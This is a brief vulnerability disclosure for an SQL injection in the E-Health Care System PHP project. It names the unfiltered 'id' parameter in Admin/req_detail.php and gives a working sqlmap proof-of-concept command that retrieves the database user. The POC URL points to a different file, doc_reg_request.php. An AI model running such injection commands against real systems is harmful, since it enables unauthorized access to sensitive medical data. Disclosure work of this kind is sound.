# E-Health Care System IN PHP has sql injection vulnerability via req_detail.php id parameter

## supplier
https://code-projects.org/e-health-care-system-in-php-css-js-and-mysql-free-download/
## Vulnerability file
Admin/req_detail.php and id parameter
## describe
There are unrestricted SQL injection attacks in the E-Health Care System. Controllable parameters: id. In req_detail.php, there is no restriction on adding id parameters to SQL statements. You can obtain sensitive information from the database.
## code analysis
The id parameters of the req_detail.php are not filtered and concatenated into the SQL statement for execution when attacker is not logining.

![image-20241104002538366](https://github.com/user-attachments/assets/6030a88e-da1f-435c-94bb-8541ab8e91ea)



## POC

```
python sqlmap.py -u "http://healthcare/Admin/doc_reg_request.php?id=1*" --level 3 --risk 2 --current-user
```

Get the current_user: root@localhost

![image-20241104002654042](https://github.com/user-attachments/assets/e451c922-0efa-4852-9327-19d5981b0ad3)

